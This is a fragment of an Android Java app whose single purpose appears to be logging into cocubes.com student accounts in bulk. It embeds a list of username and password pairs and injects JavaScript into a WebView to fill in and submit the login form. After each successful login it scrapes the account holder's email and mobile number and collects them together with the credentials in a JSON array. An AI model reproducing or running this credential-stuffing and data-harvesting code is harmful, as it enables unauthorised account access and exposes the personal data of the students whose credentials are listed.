            "shubhams79391\tshubha5808\n" +
            "sujeetku23521\tsujeet7506\n" +
            "vikramva62641\tvikram1518\n" +
            "mdshahid3\tmdshah3940\n" +
            "prashant74121\tprasha2905\n" +
            "sushantr24871\tsushan9360";

        ArrayList<ArrayList<String>> dat;
     WebView wv;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
            array = new JSONArray();


        dat =new ArrayList<>();

        for( String s : DATA.split("\n"))
        {
                ArrayList<String> tm= new ArrayList<>();
            for(String ss : s.split("\t"))
            {

                tm.add(ss);




            }
                dat.add(tm);
        }
        Log.d("DATA" , "" +dat);

        wv  = (WebView) findViewById(R.id.wv);

  WebSettings set =wv.getSettings();
wv.getSettings().setLoadsImagesAutomatically(false);
        wv.getSettings().setAppCacheMaxSize(1024 * 1024 * 8);  wv.getSettings().setAppCacheEnabled(true); wv.getSettings().setCacheMode(WebSettings.LOAD_DEFAULT);

set.setJavaScriptEnabled(true);




        xamp(coumter);


    }
JSONArray array;
int coumter = 36;
    void xamp(int i)
    {
            Log.d("checker" , dat.get(coumter).get(0) + "," + dat.get(coumter).get(1));

if(coumter>37) {


        for (int ii = 0; ii < dat.size(); ii++) {
                String op = getSharedPreferences("data", 0).getString("" + dat.get(ii), null);





                if(op!=null)
            {
                    try {

                            JSONObject take = new JSONObject(op);

                            JSONObject obj = new JSONObject();
                            obj.put("email" , take.get("email"));
                            obj.put("mobile" , take.get("mobile"));
                            obj.put("id" ,  dat.get(ii).get(0));
                            obj.put("pass" ,  dat.get(ii).get(1));
                            array.put(obj);
                            Log.d("CONTACT", array.length() +  " " + obj);

                    } catch (JSONException e) {
                            e.printStackTrace();
                            Log.d("CONTACTERR", array.length() + " " + e);
                    }

            }
        }

        return;
}

        CookieManager.getInstance().removeAllCookies(null);
        CookieManager.getInstance().flush();
        wv.stopLoading();
        wv.setWebViewClient(new WebViewClient() {


            @Override
            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                super.onReceivedError(view, errorCode, description, failingUrl);

                    xamp(coumter);



            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                wv.setWebViewClient(new WebViewClient() {


                                            @Override
                                            public boolean shouldOverrideUrlLoading(WebView view, String url) {

                                                    Log.d("AUTHENTIFICATION + OVERRIDING ", "" + url);
                                                    return false;
                                            }

                                            @Override
                                            public void onPageFinished(WebView view, String url) {
                                                    super.onPageFinished(view, url);


                                                    if (url.equals("https://www.cocubes.com/student/home.aspx")) {

                                                            //    wv.stopLoading();

                                                            final String q = "\n" +
                                                                    "function getDetails()\n" +
                                                                    "{\n" +
                                                                    "email = document.getElementById('email').getElementsByClassName('contact')[0].innerHTML\n" +
                                                                    "\n" +
                                                                    "mobile =document.getElementById('mobile').getElementsByClassName('contact')[1].innerHTML\n" +
                                                                    "\n" +
                                                                    "\n" +

                                                                    "{\n" +
                                                                    "data = {};\n" +
                                                                    "data['mobile'] =mobile\n" +
                                                                    "data['email'] =email\n" +
                                                                    "\n" +
                                                                    "return data;\n" +
                                                                    "}\n" +
                                                                    "\n" +
                                                                    "\n" +
                                                                    "}\n ; getDetails()";

                                                            run = new Runnable() {
                                                                    @Override
                                                                    public void run() {
                                                                            wv.evaluateJavascript(q, new ValueCallback<String>() {
                                                                                    @Override
                                                                                    public void onReceiveValue(String value) {
                                                                                            if (value == null || value.equals("null")) {
                                                                                                    new Handler().postDelayed(run, 100);
                                                                                            } else {

                                                                                                    Log.d("ID PASS " + coumter, value);
                                                                                                    getSharedPreferences("data", 0).edit().putString("" + dat.get(coumter), value).commit();
                                                                                                    xamp(++coumter);
                                                                                            }
                                                                                    }
                                                                            });

                                                                    }
                                                            };


                                                            new Handler().postDelayed(run,100);


                                                            // LOFFED I N


                                                    } else if (url.equals("https://www.cocubes.com/authentication/loginpage.aspx?src=4605")) {


                                                            xamp(++coumter);

                                                            // INCALID


                                                    } else if (url.contains("https://www.cocubes.com/authentication/tnc.aspx")) {
                                                            //       wv.stopLoading();

                                                            final String q = "function getDetails()\n" +
                                                                    "{\n" +
                                                                    "email = document.getElementById('txtEmail').value\n" +
                                                                    "\n" +
                                                                    "mobile =document.getElementById('txtMobile').value\n" +
                                                                    "\n" +
                                                                    "data = {};\n" +
                                                                    "data['mobile'] =mobile\n" +
                                                                    "data['email'] =email\n" +
                                                                    "\n" +
                                                                    "return data;\n" +
                                                                    "\n" +
                                                                    "\n" +
                                                                    "};getDetails()";

                                                        run2 = new Runnable() {
                                                                    @Override
                                                                    public void run() {
                                                                            wv.evaluateJavascript( q, new ValueCallback<String>() {
                                                                                    @Override
                                                                                    public void onReceiveValue(String value) {

                                                                                            if (value == null || value.equals("null")) {

                                                                                                    new Handler().postDelayed( run2, 100);
                                                                                            } else {
                                                                                                    Log.d("ID PASS " + coumter, value);
                                                                                                    getSharedPreferences("data", 0).edit().putString("" + dat.get(coumter), value).commit();

                                                                                                    xamp(++coumter);

                                                                                            }

                                                                                    }
                                                                            });
                                                                    }
                                                            };


                                                            new Handler().postDelayed( run2, 000);





                                                            // NOT CONFIRMED


                                                    } else {


                                                    }


//www.cocubes.com/authentication/tnc.aspx


                                                    Toast.makeText(MainActivity.this, "" + url, 1000).show();
                                                    Log.d("AUTHENTIFICATION", "" + url);

                                            }


                                    }

                );


                wv.evaluateJavascript("javascript:function fill(id, pass)\n" +
                        "{\n" +
                        "document.getElementById('passwdtextbox').value=pass\n" +
                        "document.getElementById('useridtextbox').value=id\n" +
                        "\n" +
                        "document.getElementById('btnLogin').click()\n" +
                        "\n" +
                        "};fill('" + dat.get(coumter).get(0) + "','" + dat.get(coumter).get(1) + "')", null);
            }
        });


        wv.loadUrl("https://www.cocubes.com/authentication/loginpage.aspx?src=4605");
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    Runnable run,run2;
}
